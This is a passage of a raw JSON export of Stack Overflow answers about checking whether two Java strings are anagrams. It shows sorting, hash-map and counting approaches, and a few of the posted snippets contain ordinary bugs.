equal:</p>\n\n<pre><code>public static boolean isAnagram(String s1, String s2){\n\n        // Early termination check, if strings are of unequal lengths,\n        // then they cannot be anagrams\n        if ( s1.length() != s2.length() ) {\n            return false;\n        }\n        s1=s1.toLowerCase();\n        s2=s2.toLowerCase();\n        char[] c1 = s1.toCharArray();\n        char[] c2 = s2.toCharArray();\n        Arrays.sort(c1);\n        Arrays.sort(c2);\n        String sc1 = new String(c1);\n        String sc2 = new String(c2);\n        return sc1.equals(sc2);\n}\n</code></pre>\n\n<p>Personally I think it's more readable than nested for-loops =p</p>\n\n<p>This has <strong>O(n log n)</strong> run-time complexity, where <code>n</code> is the length of the longer string.</p>\n\n<p>Edit: this is not the optimal solution. See @aam1r's answer for the most efficient approach (i.e. what you should actually say in an interview)</p>\n"},{"tags":[],"owner":{"account_id":23121,"reputation":527346,"user_id":57695,"accept_rate":75,"display_name":"Peter Lawrey"},"down_vote_count":1,"up_vote_count":9,"is_accepted":false,"score":8,"last_activity_date":1456046652,"creation_date":1354571224,"answer_id":13692317,"question_id":13692221,"body_markdown":"What would be more efficient is to compare the Strings in sorted order.\r\n\r\n    public static boolean isAnagram(String s1 , String s2) {\r\n        return s1.length() == s2.length() \r\n            &amp;&amp; checkSum(s1) == checkSum(s2)\r\n            &amp;&amp; Arrays.equals(lettersSorted(s1), lettersSorted(s2));\r\n    }\r\n\r\n    static long checkSum(String s) {\r\n        long sqrSum = 0;\r\n        for(int i = 0; i &lt; s.length(); s++) {\r\n           char ch = s.charAt(i);\r\n           sqrSum += ch + (1L &lt;&lt; ch);\r\n        }\r\n    }\r\n\r\n    static char[] lettersSorted(String s) {\r\n        char[] chars = s.toCharArray();\r\n        Arrays.sort(chars);\r\n        return chars;\r\n    }\r\n\r\nThis is an O(N ln N) algorithm, but will be O(N) on an average if the Strings are typically not anagrams.","title":"Anagram algorithm in java","body":"<p>What would be more efficient is to compare the Strings in sorted order.</p>\n\n<pre><code>public static boolean isAnagram(String s1 , String s2) {\n    return s1.length() == s2.length() \n        &amp;&amp; checkSum(s1) == checkSum(s2)\n        &amp;&amp; Arrays.equals(lettersSorted(s1), lettersSorted(s2));\n}\n\nstatic long checkSum(String s) {\n    long sqrSum = 0;\n    for(int i = 0; i &lt; s.length(); s++) {\n       char ch = s.charAt(i);\n       sqrSum += ch + (1L &lt;&lt; ch);\n    }\n}\n\nstatic char[] lettersSorted(String s) {\n    char[] chars = s.toCharArray();\n    Arrays.sort(chars);\n    return chars;\n}\n</code></pre>\n\n<p>This is an O(N ln N) algorithm, but will be O(N) on an average if the Strings are typically not anagrams.</p>\n"},{"tags":[],"owner":{"account_id":1968644,"reputation":32046,"user_id":1768232,"accept_rate":81,"display_name":"durron597"},"down_vote_count":1,"up_vote_count":8,"is_accepted":false,"score":7,"last_activity_date":1354571582,"creation_date":1354571279,"answer_id":13692333,"question_id":13692221,"body_markdown":"I&#39;m not sure what you&#39;re trying to do, but I&#39;m pretty sure it won&#39;t work (and it runs in `O(n^2)`. Try this (which runs in `O(n log n)`) instead:\r\n\r\n    public static boolean isAnagram(String s1, String s2){\r\n      if (s1.length() != s2.length()) return false;\r\n\r\n      char[] c1 = s1.toCharArray();\r\n      char[] c2 = s2.toCharArray();\r\n      \r\n      Arrays.sort(c1);\r\n      Arrays.sort(c2);\r\n      \r\n      for(int i = 0; i &lt; c1.length; i++) {\r\n        if(c1[i] != c2[i]) return false;\r\n      }\r\n      \r\n      return true;\r\n    }","title":"Anagram algorithm in java","body":"<p>I'm not sure what you're trying to do, but I'm pretty sure it won't work (and it runs in <code>O(n^2)</code>. Try this (which runs in <code>O(n log n)</code>) instead:</p>\n\n<pre><code>public static boolean isAnagram(String s1, String s2){\n  if (s1.length() != s2.length()) return false;\n\n  char[] c1 = s1.toCharArray();\n  char[] c2 = s2.toCharArray();\n\n  Arrays.sort(c1);\n  Arrays.sort(c2);\n\n  for(int i = 0; i &lt; c1.length; i++) {\n    if(c1[i] != c2[i]) return false;\n  }\n\n  return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1113181,"reputation":175,"user_id":1103205,"accept_rate":21,"display_name":"user1103205"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1354571645,"creation_date":1354571645,"answer_id":13692438,"question_id":13692221,"body_markdown":"just making sure, you are trying to check to see if s1 is a anagram of s2 correct? That would also mean s2 is a an anagram of s1. So i would just sort s1 and s2 and check to see if they are equal. \r\n\r\n    String string1 = &quot;fdafdas&quot;;\r\n    String string2 = &quot;fdwqkjl&quot;;\r\n\tchar[] chars = string1.toCharArray();\r\n\tchar[] chars2 = string2.toCharArray();\r\n\tArrays.sort(chars);\r\n\tArrays.sort(chars2);\r\n\tstring1 = new String(chars);\r\n\tstring2 = new String(chars2);\r\n    if (string1.equals(string2)) {\r\n        //They are an anagram\r\n    }","title":"Anagram algorithm in java","body":"<p>just making sure, you are trying to check to see if s1 is a anagram of s2 correct? That would also mean s2 is a an anagram of s1. So i would just sort s1 and s2 and check to see if they are equal. </p>\n\n<pre><code>String string1 = \"fdafdas\";\nString string2 = \"fdwqkjl\";\nchar[] chars = string1.toCharArray();\nchar[] chars2 = string2.toCharArray();\nArrays.sort(chars);\nArrays.sort(chars2);\nstring1 = new String(chars);\nstring2 = new String(chars2);\nif (string1.equals(string2)) {\n    //They are an anagram\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":874777,"reputation":5342,"user_id":924643,"accept_rate":100,"display_name":"Aamir"},"down_vote_count":1,"up_vote_count":32,"is_accepted":false,"score":31,"last_activity_date":1354572917,"creation_date":1354572288,"answer_id":13692584,"question_id":13692221,"body_markdown":"This can be done in **linear time using constant space**. Here is pseudo-code to help you get started:\r\n\r\n    // Create new hashtable/hashmap to keep track of how many times each character\r\n    // is being used\r\n    character_map -&gt; new hash map\r\n\r\n    // Initial check. If lengths are not the same, they can&#39;t be anagrams.\r\n    if s1.length != s2.length:\r\n        throw exception &quot;Not anagrams&quot;\r\n\r\n    // Add all characters from s1 to hashmap. Increment the value to keep track of\r\n    // number of occurences\r\n    foreach character c1 in s1:\r\n        character_map[c1]++\r\n\r\n    // Iterate through all character in s2 and decrement count of each character.\r\n    foreach character c2 in s2:\r\n        character_map[c2]--\r\n\r\n    // If they are anagrams, each character should be at &quot;0&quot; count at the point.\r\n    // If we come across a character that is not, it means that they are not anagrams\r\n    foreach key k, value v in character_map:\r\n        if v != 0:\r\n                throw exception &quot;Not anagrams&quot;\r\n\r\nThis code does not sort and hence can be done using simple loops. The overall runtime is O(n) and overall space is O(1) -- hence being the fastest solution. The number of elements you can have in the hash map is constant (i.e. you know how many items there are in your alphabet set).","title":"Anagram algorithm in java","body":"<p>This can be done in <strong>linear time using constant space</strong>. Here is pseudo-code to help you get started:</p>\n\n<pre><code>// Create new hashtable/hashmap to keep track of how many times each character\n// is being used\ncharacter_map -&gt; new hash map\n\n// Initial check. If lengths are not the same, they can't be anagrams.\nif s1.length != s2.length:\n    throw exception \"Not anagrams\"\n\n// Add all characters from s1 to hashmap. Increment the value to keep track of\n// number of occurences\nforeach character c1 in s1:\n    character_map[c1]++\n\n// Iterate through all character in s2 and decrement count of each character.\nforeach character c2 in s2:\n    character_map[c2]--\n\n// If they are anagrams, each character should be at \"0\" count at the point.\n// If we come across a character that is not, it means that they are not anagrams\nforeach key k, value v in character_map:\n    if v != 0:\n            throw exception \"Not anagrams\"\n</code></pre>\n\n<p>This code does not sort and hence can be done using simple loops. The overall runtime is O(n) and overall space is O(1) -- hence being the fastest solution. The number of elements you can have in the hash map is constant (i.e. you know how many items there are in your alphabet set).</p>\n"},{"tags":[],"owner":{"account_id":126310,"reputation":4256,"user_id":322722,"accept_rate":88,"display_name":"cmonkey"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1354572312,"creation_date":1354572312,"answer_id":13692593,"question_id":13692221,"body_markdown":"The reason it doesn&#39;t work:\r\n\r\nUsing &quot;des&quot; and &quot;sed&quot; as an example.\r\n\r\nIn the last iteration for which it matches, it will evaluate:\r\n\r\n    if(s1.charAt(i)==s2.charAt(j))\r\n    {\r\n        delStr=s1.substring(i,i+1);\r\n        newStr=s2.replace(delStr,&quot;&quot;);\r\n    }\r\n\r\nWhich will be: if( &quot;s&quot; == &quot;s&quot; )\r\n\r\nIt will then enter the if block, and evaluate\r\n\r\n    newStr = &quot;sed&quot;.replace(&quot;s&quot;,&quot;&quot;);\r\n\r\nwhich will give you &quot;ed&quot;, instead of an empty string.\r\n\r\nThe moral of the story is that you are always replacing characters from s2 less one character, which will never be empty.\r\n\r\nUsing String.replace() is bad anyway, because it will replace all instances of the character by default. With String.replace(), it would consider &quot;sed&quot; to be an anagram of &quot;seeeeeeed&quot;. You would do better to use String.replaceFirst().\r\n\r\nIn any case, a starting point is to make the following modifications:\r\n\r\n    String newStr = s2;\r\n    ...\r\n    // inside if block\r\n    newStr = newStr.replaceFirst( delStr, &quot;&quot; );","title":"Anagram algorithm in java","body":"<p>The reason it doesn't work:</p>\n\n<p>Using \"des\" and \"sed\" as an example.</p>\n\n<p>In the last iteration for which it matches, it will evaluate:</p>\n\n<pre><code>if(s1.charAt(i)==s2.charAt(j))\n{\n    delStr=s1.substring(i,i+1);\n    newStr=s2.replace(delStr,\"\");\n}\n</code></pre>\n\n<p>Which will be: if( \"s\" == \"s\" )</p>\n\n<p>It will then enter the if block, and evaluate</p>\n\n<pre><code>newStr = \"sed\".replace(\"s\",\"\");\n</code></pre>\n\n<p>which will give you \"ed\", instead of an empty string.</p>\n\n<p>The moral of the story is that you are always replacing characters from s2 less one character, which will never be empty.</p>\n\n<p>Using String.replace() is bad anyway, because it will replace all instances of the character by default. With String.replace(), it would consider \"sed\" to be an anagram of \"seeeeeeed\". You would do better to use String.replaceFirst().</p>\n\n<p>In any case, a starting point is to make the following modifications:</p>\n\n<pre><code>String newStr = s2;\n...\n// inside if block\nnewStr = newStr.replaceFirst( delStr, \"\" );\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2685362,"reputation":74,"user_id":2319874,"display_name":"Kundan Jha"},"down_vote_count":2,"up_vote_count":1,"is_accepted":false,"score":-1,"last_activity_date":1366895174,"creation_date":1366895174,"answer_id":16215574,"question_id":13692221,"body_markdown":"\r\n\r\n\r\n\r\n    import java.util.*;\r\n    class Anagrams \r\n    {\r\n    \tpublic static void main(String[] args) \r\n    \t{\r\n    \t\tSystem.out.println(&quot;Enter the two words&quot;);\r\n    \t\tScanner scan = new Scanner(System.in);\r\n    \t\tString word1 = scan.next();\r\n    \t\tString word2=scan.next();\r\n    \r\n    \t\tStringBuilder sb1= new StringBuilder(word1);\r\n    \t\tStringBuilder sb2= new StringBuilder(word2);\r\n    \t\tint count=0;\r\n    \t\tSystem.out.println(&quot;length ! &quot;+sb1.length());\r\n    \t\tSystem.out.println(&quot;Length ! &quot;+sb2.length());\r\n    \t\tif(sb1.length()==sb2.length()){\r\n    \t\t\tfor(int i=0;i&lt;sb1.length();i++){\r\n    \t\t\t\tfor(int k=0;k&lt;sb2.length();k++){\r\n    \t\t\t\t\tif(sb1.charAt(i)==sb2.charAt(k)){\r\n    \t\t\t\t\t\tsb2.deleteCharAt(k);\r\n    \t\t\t\t\t\tcount++;\r\n    \t\t\t\t\t\tSystem.out.println(&quot;Count is &quot;+count);\r\n    \t\t\t\t\t\tbreak;\r\n    \t\t\t\t\t}\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \r\n    \t\t\tif(count==sb1.length()){\r\n    \r\n    \t\t\t\tSystem.out.println(&quot;Anagrams!&quot;);\r\n    \t\t\t}\r\n    \t\t\telse{\r\n    \t\t\t\tSystem.out.println(&quot;Not Anagrams&quot;);\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\telse{\r\n    \t\t\tSystem.out.println(&quot;Not equal in length&quot;);\r\n    \t\t}\r\n    \t}\r\n    }\r\n\r\n","title":"Anagram algorithm in java","body":"<pre><code>import java.util.*;\nclass Anagrams \n{\n    public static void main(String[] args) \n    {\n        System.out.println(\"Enter the two words\");\n        Scanner scan = new Scanner(System.in);\n        String word1 = scan.next();\n        String word2=scan.next();\n\n        StringBuilder sb1= new StringBuilder(word1);\n        StringBuilder sb2= new StringBuilder(word2);\n        int count=0;\n        System.out.println(\"length ! \"+sb1.length());\n        System.out.println(\"Length ! \"+sb2.length());\n        if(sb1.length()==sb2.length()){\n            for(int i=0;i&lt;sb1.length();i++){\n                for(int k=0;k&lt;sb2.length();k++){\n                    if(sb1.charAt(i)==sb2.charAt(k)){\n                        sb2.deleteCharAt(k);\n                        count++;\n                        System.out.println(\"Count is \"+count);\n                        break;\n                    }\n                }\n            }\n\n            if(count==sb1.length()){\n\n                System.out.println(\"Anagrams!\");\n            }\n            else{\n                System.out.println(\"Not Anagrams\");\n            }\n        }\n        else{\n            System.out.println(\"Not equal in length\");\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"display_name":"user2018144"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1373647395,"creation_date":1373647395,"answer_id":17619855,"question_id":13692221,"body_markdown":"    public boolean isAnagram(String a, String b) {\r\n\r\n      boolean result = false;\r\n\r\n      final String one = a.replaceAll(&quot;[\\\\s+\\\\W+]&quot;, &quot;&quot;).toLowerCase();\r\n\r\n      final String two = b.replaceAll(&quot;[\\\\s+\\\\W+]&quot;, &quot;&quot;).toLowerCase();\r\n\r\n      if (one.length() == two.length()) {\r\n\r\n          final char[] oneArray =  one.toCharArray();\r\n\r\n          final char[] twoArray =  two.toCharArray(); \r\n\r\n          Arrays.sort(oneArray);\r\n\r\n          Arrays.sort(twoArray);\r\n\r\n          result = Arrays.equals(oneArray, twoArray);\r\n\r\n        }\r\n\r\n      return result; \r\n\r\n    }","title":"Anagram algorithm in java","body":"<pre><code>public boolean isAnagram(String a, String b) {\n\n  boolean result = false;\n\n  final String one = a.replaceAll(\"[\\\\s+\\\\W+]\", \"\").toLowerCase();\n\n  final String two = b.replaceAll(\"[\\\\s+\\\\W+]\", \"\").toLowerCase();\n\n  if (one.length() == two.length()) {\n\n      final char[] oneArray =  one.toCharArray();\n\n      final char[] twoArray =  two.toCharArray(); \n\n      Arrays.sort(oneArray);\n\n      Arrays.sort(twoArray);\n\n      result = Arrays.equals(oneArray, twoArray);\n\n    }\n\n  return result; \n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2497303,"reputation":21,"user_id":2173400,"display_name":"Sahil Madan"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1500633078,"creation_date":1387499625,"answer_id":20694360,"question_id":13692221,"body_markdown":"I guess the following solution has `O(n)` complexity, let me know if someone differs. \r\n\r\n    import java.util.HashMap;\r\n    import java.util.Scanner;\r\n    \r\n    \r\n    public class Anagrams {\r\n    \t\r\n    \tstatic boolean isAnagram(String word1, String word2)\r\n    \t{\r\n    \t\tif(word1.length() != word2.length()) {\r\n    \t\t\treturn false;\r\n    \t\t}\r\n    \t\tint flag=0;\r\n    \t\tHashMap&lt;Character,Integer&gt; table = new HashMap&lt;Character,Integer&gt;();\r\n    \t\tfor(int i=0; i&lt; word1.length();i++) {\r\n    \t\t\ttable.put(word1.charAt(i),1);\r\n    \t\t}\r\n    \t\t\r\n    \t\tfor(int i=0; i&lt; word2.length();i++) {\r\n    \t\t\tif(table.containsKey(word2.charAt(i))) {\r\n    \t\t\t\tcontinue;\r\n    \t\t\t} else {\r\n    \t\t\t\tflag=1;\r\n    \t\t\t\tbreak;\r\n    \t\t\t}\t\r\n    \t\t}\r\n    \t\treturn flag == 0;\r\n    \t}\r\n    \r\n    \tpublic static void main(String[] args) {\r\n    \t\tSystem.out.println(&quot;Enter your string&quot;);\r\n    \t\tScanner sc= new Scanner(System.in);\r\n    \t\tString word1= sc.nextLine();\r\n    \t\tString word2=sc.nextLine();\r\n    \t\t\r\n    \t\t boolean result = isAnagram(word1,word2);\r\n    \t\t if(result) {\r\n    \t\t     System.out.println(&quot;The words are Anagrams&quot;);\r\n    \t\t } else{\r\n    \t\t\t System.out.println(&quot;The words are not Anagrams&quot;);\t \r\n             }\r\n    \t}\r\n    }\r\n\r\n","title":"Anagram algorithm in java","body":"<p>I guess the following solution has <code>O(n)</code> complexity, let me know if someone differs. </p>\n\n<pre><code>import java.util.HashMap;\nimport java.util.Scanner;\n\n\npublic class Anagrams {\n\n    static boolean isAnagram(String word1, String word2)\n    {\n        if(word1.length() != word2.length()) {\n            return false;\n        }\n        int flag=0;\n        HashMap&lt;Character,Integer&gt; table = new HashMap&lt;Character,Integer&gt;();\n        for(int i=0; i&lt; word1.length();i++) {\n            table.put(word1.charAt(i),1);\n        }\n\n        for(int i=0; i&lt; word2.length();i++) {\n            if(table.containsKey(word2.charAt(i))) {\n                continue;\n            } else {\n                flag=1;\n                break;\n            }   \n        }\n        return flag == 0;\n    }\n\n    public static void main(String[] args) {\n        System.out.println(\"Enter your string\");\n        Scanner sc= new Scanner(System.in);\n        String word1= sc.nextLine();\n        String word2=sc.nextLine();\n\n         boolean result = isAnagram(word1,word2);\n         if(result) {\n             System.out.println(\"The words are Anagrams\");\n         } else{\n             System.out.println(\"The words are not Anagrams\");   \n         }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":105356,"reputation":2071,"user_id":281191,"accept_rate":0,"display_name":"goroncy"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1391519153,"creation_date":1391519153,"answer_id":21553387,"question_id":13692221,"body_markdown":"O(n) solution without any kind of sorting and using only one map. Also added proper null check missing in other solutions. \r\n\r\n    public boolean isAnagram(String leftString, String rightString) {\r\n      if (leftString == null || rightString == null) {\r\n        return false;\r\n      } else if (leftString.length() != rightString.length()) {\r\n        return false;\r\n      }\r\n\r\n      Map&lt;Character, Integer&gt; occurrencesMap = new HashMap&lt;&gt;();\r\n\r\n      for(int i = 0; i &lt; leftString.length(); i++){\r\n        char charFromLeft = leftString.charAt(i);\r\n        int nrOfCharsInLeft = occurrencesMap.containsKey(charFromLeft) ? occurrencesMap.get(charFromLeft) : 0;\r\n        occurrencesMap.put(charFromLeft, ++nrOfCharsInLeft);\r\n        char charFromRight = rightString.charAt(i);\r\n        int nrOfCharsInRight = occurrencesMap.containsKey(charFromRight) ? occurrencesMap.get(charFromRight) : 0;\r\n        occurrencesMap.put(charFromRight, --nrOfCharsInRight);\r\n      }\r\n\r\n      for(int occurrencesNr : occurrencesMap.values()){\r\n        if(occurrencesNr != 0){\r\n          return false;\r\n        }\r\n      }\r\n\r\n      return true;\r\n    }\r\n\r\nand less generic solution but a little bit faster one:\r\n\r\n    public boolean isAnagram(String leftString, String rightString) {\r\n      if (leftString == null || rightString == null) {\r\n        return false;\r\n      } else if (leftString.length() != rightString.length()) {\r\n        return false;\r\n      }\r\n\r\n      char letters[] = {&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;};\r\n      Map&lt;Character, Integer&gt; occurrencesMap = new HashMap&lt;&gt;();\r\n      for (char l : letters) {\r\n        occurrencesMap.put(l, 0);\r\n      }\r\n\r\n      for(int i = 0; i &lt; leftString.length(); i++){\r\n        char charFromLeft = leftString.charAt(i);\r\n        Integer nrOfCharsInLeft = occurrencesMap.get(charFromLeft);\r\n        occurrencesMap.put(charFromLeft, ++nrOfCharsInLeft);\r\n        char charFromRight = rightString.charAt(i);\r\n        Integer nrOfCharsInRight = occurrencesMap.get(charFromRight);\r\n        occurrencesMap.put(charFromRight, --nrOfCharsInRight);\r\n      }\r\n\r\n      for(Integer occurrencesNr : occurrencesMap.values()){\r\n        if(occurrencesNr != 0){\r\n          return false;\r\n        }\r\n      }\r\n\r\n      return true;\r\n    }","title":"Anagram algorithm in java","body":"<p>O(n) solution without any kind of sorting and using only one map. Also added proper null check missing in other solutions. </p>\n\n<pre><code>public boolean isAnagram(String leftString, String rightString) {\n  if (leftString == null || rightString == null) {\n    return false;\n  } else if (leftString.length() != rightString.length()) {\n    return false;\n  }\n\n  Map&lt;Character, Integer&gt; occurrencesMap = new HashMap&lt;&gt;();\n\n  for(int i = 0; i &lt; leftString.length(); i++){\n    char charFromLeft = leftString.charAt(i);\n    int nrOfCharsInLeft = occurrencesMap.containsKey(charFromLeft) ? occurrencesMap.get(charFromLeft) : 0;\n    occurrencesMap.put(charFromLeft, ++nrOfCharsInLeft);\n    char charFromRight = rightString.charAt(i);\n    int nrOfCharsInRight = occurrencesMap.containsKey(charFromRight) ? occurrencesMap.get(charFromRight) : 0;\n    occurrencesMap.put(charFromRight, --nrOfCharsInRight);\n  }\n\n  for(int occurrencesNr : occurrencesMap.values()){\n    if(occurrencesNr != 0){\n      return false;\n    }\n  }\n\n  return true;\n}\n</code></pre>\n\n<p>and less generic solution but a little bit faster one:</p>\n\n<pre><code>public boolean isAnagram(String leftString, String rightString) {\n  if (leftString == null || rightString == null) {\n    return false;\n  } else if (leftString.length() != rightString.length()) {\n    return false;\n  }\n\n  char letters[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};\n  Map&lt;Character, Integer&gt; occurrencesMap = new HashMap&lt;&gt;();\n  for (char l : letters) {\n    occurrencesMap.put(l, 0);\n  }\n\n  for(int i = 0; i &lt; leftString.length(); i++){\n    char charFromLeft = leftString.charAt(i);\n    Integer nrOfCharsInLeft = occurrencesMap.get(charFromLeft);\n    occurrencesMap.put(charFromLeft, ++nrOfCharsInLeft);\n    char charFromRight = rightString.charAt(i);\n    Integer nrOfCharsInRight = occurrencesMap.get(charFromRight);\n    occurrencesMap.put(charFromRight, --nrOfCharsInRight);\n  }\n\n  for(Integer occurrencesNr : occurrencesMap.values()){\n    if(occurrencesNr != 0){\n      return false;\n    }\n  }\n\n  return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":42924,"reputation":310,"user_id":125241,"accept_rate":50,"display_name":"RD."},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1397284376,"creation_date":1397284376,"answer_id":23027009,"question_id":13692221,"body_markdown":"Here&#39;s a Simpler approach relying mostly on java \r\nThe complete code is here https://github.com/rdsr/algorithms/blob/master/src/jvm/misc/AnagramsList.java (Note this solves a related by different problem)\r\n\r\n    class Anagram {\r\n        Map&lt;Character, Integer&gt; anagram;\r\n    \r\n        Anagram(String s) {\r\n            anagram = new HashMap&lt;Character, Integer&gt;();\r\n            \r\n            for (final Character c : s.toCharArray()) {\r\n                if (anagram.containsKey(c)) {\r\n                    anagram.put(c, 1 + anagram.get(c));\r\n                } else {\r\n                    anagram.put(c, 1);\r\n                }\r\n            }\r\n        }\r\n    \r\n        @Override\r\n        public int hashCode() {\r\n            //.. elided\r\n        }\r\n    \r\n        @Override\r\n        public boolean equals(Object obj) {\r\n            //.. elided\r\n        }\r\n    }\r\n    \r\n    \r\n        public class Anagrams {\r\n                public static void main(String[] args) {\r\n                    System.out.println(new Anagram(&quot;abc&quot;).equals(new Anagram(&quot;bac&quot;)));\r\n                }\r\n            }\r\n\r\n","title":"Anagram algorithm in java","body":"<p>Here's a Simpler approach relying mostly on java \nThe complete code is here <a href=\"https://github.com/rdsr/algorithms/blob/master/src/jvm/misc/AnagramsList.java\" rel=\"nofollow\">https://github.com/rdsr/algorithms/blob/master/src/jvm/misc/AnagramsList.java</a> (Note this solves a related by different problem)</p>\n\n<pre><code>class Anagram {\n    Map&lt;Character, Integer&gt; anagram;\n\n    Anagram(String s) {\n        anagram = new HashMap&lt;Character, Integer&gt;();\n\n        for (final Character c : s.toCharArray()) {\n            if (anagram.containsKey(c)) {\n                anagram.put(c, 1 + anagram.get(c));\n            } else {\n                anagram.put(c, 1);\n            }\n        }\n    }\n\n    @Override\n    public int hashCode() {\n        //.. elided\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        //.. elided\n    }\n}\n\n\n    public class Anagrams {\n            public static void main(String[] args) {\n                System.out.println(new Anagram(\"abc\").equals(new Anagram(\"bac\")));\n            }\n        }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2721186,"reputation":521,"user_id":2347455,"accept_rate":38,"display_name":"Roshan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1399914642,"creation_date":1399914147,"answer_id":23614842,"question_id":13692221,"body_markdown":"Faster version using bit vector approach for anagram substrings\r\n\r\n    public boolean isAnagram(String _source1, String _source2)\r\n \t{\r\n\t\t\r\n\t\tint flag = 0, char_index = 0, counter = 0;\r\n\t\tif(_source2.length() &lt; _source1.length()){\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tchar[] _stringchar = _source1.toCharArray();\r\n\t\tchar[] _tocheck = _source2.toCharArray();\r\n\t\tfor(char character : _stringchar)\r\n\t\t{\r\n\t\t\tchar_index = character - &#39;a&#39;;\r\n\t\t\tif((flag &amp; (1 &lt;&lt; char_index)) == 0)\r\n\t\t\t\tflag |= (1 &lt;&lt; char_index);\r\n\t\t}\r\n\t\t\r\n\t\tfor(char toCheckcChar : _tocheck)\r\n\t\t{\r\n\t\t\tchar_index = toCheckcChar - &#39;a&#39;;\r\n\t\t\t\r\n\t\t\tif((flag &amp; (1 &lt;&lt; char_index)) &gt; 0)\r\n\t\t\t\tcounter++;\r\n\t\t\telse\r\n\t\t\t\tcounter = 0;\r\n\t\t\t\r\n\t\t\tif(counter == _source1.length())\r\n\t\t\t\treturn true;\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\treturn false;\r\n\t}","title":"Anagram algorithm in java","body":"<p>Faster version using bit vector approach for anagram substrings</p>\n\n<pre><code>public boolean isAnagram(String _source1, String _source2)\n{\n\n    int flag = 0, char_index = 0, counter = 0;\n    if(_source2.length() &lt; _source1.length()){\n        return false;\n    }\n    char[] _stringchar = _source1.toCharArray();\n    char[] _tocheck = _source2.toCharArray();\n    for(char character : _stringchar)\n    {\n        char_index = character - 'a';\n        if((flag &amp; (1 &lt;&lt; char_index)) == 0)\n            flag |= (1 &lt;&lt; char_index);\n    }\n\n    for(char toCheckcChar : _tocheck)\n    {\n        char_index = toCheckcChar - 'a';\n\n        if((flag &amp; (1 &lt;&lt; char_index)) &gt; 0)\n            counter++;\n        else\n            counter = 0;\n\n        if(counter == _source1.length())\n            return true;\n\n    }\n\n    return false;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4252042,"reputation":43,"user_id":3478792,"display_name":"Bhavya"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1406407703,"creation_date":1406406045,"answer_id":24975190,"question_id":13692221,"body_markdown":"The simple reason is, because replace function creates a new `String` object. It does not do anything to the actual string (in your case `s2`), because in Java, strings are final by nature. So as pointed out by cmonkey, you are always removing one character from your string s2, but in reality a new `String` object is created with 1 character less, s2 remains as is. \r\n    \r\nThe simple way to get this working in your case would be to create a new string object and assign it to yourself.\r\n    \r\n    {\r\n        s2=s2.replace(delString,&quot;&quot;);\r\n        ....\r\n        if(s2.empty()) return true;\r\n        return false;\r\n    }","title":"Anagram algorithm in java","body":"<p>The simple reason is, because replace function creates a new <code>String</code> object. It does not do anything to the actual string (in your case <code>s2</code>), because in Java, strings are final by nature. So as pointed out by cmonkey, you are always removing one character from your string s2, but in reality a new <code>String</code> object is created with 1 character less, s2 remains as is. </p>\n\n<p>The simple way to get this working in your case would be to create a new string object and assign it to yourself.</p>\n\n<pre><code>{\n    s2=s2.replace(delString,\"\");\n    ....\n    if(s2.empty()) return true;\n    return false;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4560593,"reputation":99,"user_id":3703055,"display_name":"RKP"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1429637253,"creation_date":1429637253,"answer_id":29779186,"question_id":13692221,"body_markdown":"just see at line\r\nnewStr=s2.replace(delStr,&quot;&quot;);\r\n\r\nwhat you are doing here\r\nreplacing a char in s2 and assigning back to newStr, means you are not changing anything in s2. Just replace this code by below one it will work fine\r\n\r\nnewStr=newStr.replace(delStr,&quot;&quot;);","title":"Anagram algorithm in java","body":"<p>just see at line\nnewStr=s2.replace(delStr,\"\");</p>\n\n<p>what you are doing here\nreplacing a char in s2 and assigning back to newStr, means you are not changing anything in s2. Just replace this code by below one it will work fine</p>\n\n<p>newStr=newStr.replace(delStr,\"\");</p>\n"},{"tags":[],"owner":{"account_id":1700242,"reputation":656,"user_id":1560534,"accept_rate":82,"display_name":"broadbear"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1462160764,"creation_date":1440201490,"answer_id":32150902,"question_id":13692221,"body_markdown":"Below is a concise code snippet that determines whether two strings are anagrams in a single iteration of both strings, plus a final iteration of a 256 element array. This approach avoids sorting the characters in the strings and converting to/from Strings/char arrays by recording character counts in a mapping array.\r\n\r\n    static boolean isAnagram(String s1, String s2) {\r\n        if (s1.length() != s2.length()) return false;\r\n        int n = s1.length();\r\n        int[] charMap = new int[256];\r\n        for (int i = 0; i &lt; n; i++) {\r\n        \tchar c1 = s1.charAt(i);\r\n        \tcharMap[c1]++;\r\n        \tchar c2 = s2.charAt(i);\r\n        